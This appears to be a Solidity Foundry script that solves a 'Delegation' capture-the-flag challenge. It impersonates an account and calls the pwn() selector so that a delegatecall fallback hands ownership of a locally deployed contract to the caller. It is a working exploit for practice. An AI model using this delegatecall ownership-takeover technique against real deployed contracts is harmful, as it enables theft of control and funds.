// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Delegation.sol";

contract DelegationHack is Script {
    Delegate public delegate;
    Delegation public delegation;
    address public constant eoa = address(1024);

    function run() public {
        delegate = new Delegate(address(0));
        delegation = new Delegation(address(delegate));
        vm.deal(eoa, 1 ether);

        console.log("Before, the owner of Delegation:", delegation.owner());
        vm.startPrank(eoa);
        bytes4 pwnSelector = bytes4(keccak256("pwn()"));
        (bool success, ) = address(delegation).call(abi.encode(pwnSelector));
        if (!success) {
            revert();
        }
        vm.stopPrank();
        console.log("After, the owner of Delegation:", delegation.owner());
    }
}
